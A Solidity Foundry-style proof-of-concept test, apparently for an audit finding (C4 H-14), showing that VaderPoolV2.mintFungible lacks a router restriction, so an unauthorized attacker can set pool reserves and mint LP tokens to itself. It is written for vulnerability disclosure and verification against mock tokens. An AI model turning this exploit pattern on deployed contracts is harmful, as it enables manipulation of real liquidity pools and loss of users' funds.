// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.9;

import "contracts/dex-v2/pool/VaderPoolV2.sol";
import "contracts/interfaces/dex-v2/wrapper/ILPWrapper.sol";
import "contracts/interfaces/dex-v2/synth/ISynthFactory.sol";
import "./src/Mocks.sol";

interface Vm {
    function prank(address sender) external;
}

/// @title PoC: mintFungible missing router restriction
/// @notice Demonstrates that an unauthorized caller (not the router) can call
///         VaderPoolV2.mintFungible and mint LP liquidity for a pair with
///         attacker-chosen parameters, because the function carries no
///         onlyRouter guard. Matches C4 H-14.
contract PoC_MintFungible {
    Vm private constant vm = Vm(
        address(uint160(uint256(keccak256("hevm cheat code"))))
    );

    address private constant DEPLOYER = address(0xD0DB);
    address private constant ROUTER = address(0xE7E7); // authorized pool caller
    address private constant ATTACKER = address(0xA11CE); // unauthorized caller

    VaderPoolV2 private target;
    ERC20Mock private native;
    ERC20Mock private foreign2;
    WrapperMock private wrapper;
    SynthFactoryMock private synthFactory;
    ERC20Mock private lpToken;

    uint256 private constant ATTACK_NATIVE = 10e18;
    uint256 private constant ATTACK_FOREIGN = 500_000e18; // skewed ratio

    function setUp() public {
        vm.prank(DEPLOYER);
        native = new ERC20Mock("USDC", "USDC");
        vm.prank(DEPLOYER);
        foreign2 = new ERC20Mock("FOREIGN-2", "FOR2");
        vm.prank(DEPLOYER);
        lpToken = new ERC20Mock("VADER-LP", "VLP");

        vm.prank(DEPLOYER);
        wrapper = new WrapperMock();
        vm.prank(DEPLOYER);
        synthFactory = new SynthFactoryMock();
        vm.prank(DEPLOYER);
        target = new VaderPoolV2(true, native);

        // wire the pool as the protocol does after deployment
        vm.prank(DEPLOYER);
        target.setTokenSupport(foreign2, true);
        vm.prank(DEPLOYER);
        target.initialize(
            ILPWrapper(address(wrapper)),
            ISynthFactory(address(synthFactory)),
            ROUTER
        );
        vm.prank(DEPLOYER);
        wrapper.setToken(foreign2, lpToken);
    }

    function test_exploit() public {
        vm.prank(ATTACKER);
        native.mint(ATTACKER, ATTACK_NATIVE);
        vm.prank(ATTACKER);
        foreign2.mint(ATTACKER, ATTACK_FOREIGN);
        vm.prank(ATTACKER);
        native.approve(address(target), ATTACK_NATIVE);
        vm.prank(ATTACKER);
        foreign2.approve(address(target), ATTACK_FOREIGN);

        (uint112 beforeNative, uint112 beforeForeign, ) = target.getReserves(
            foreign2
        );

        // unauthorized caller mints LP against attacker-chosen liquidity
        vm.prank(ATTACKER);
        target.mintFungible(
            foreign2,
            ATTACK_NATIVE,
            ATTACK_FOREIGN,
            ATTACKER,
            ATTACKER
        );

        (uint112 reserveNative, uint112 reserveForeign, ) = target.getReserves(
            foreign2
        );
        uint256 lpMinted = lpToken.balanceOf(ATTACKER);

        // impact: reserves were authored by attacker and LP was minted to them
        require(reserveNative == uint112(ATTACK_NATIVE), "native reserve mismatch");
        require(reserveForeign == uint112(ATTACK_FOREIGN), "foreign reserve mismatch");
        require(
            reserveNative > beforeNative && reserveForeign > beforeForeign,
            "no reserve change"
        );
        require(lpMinted == ATTACK_NATIVE, "exploit impact was not observed");
    }
}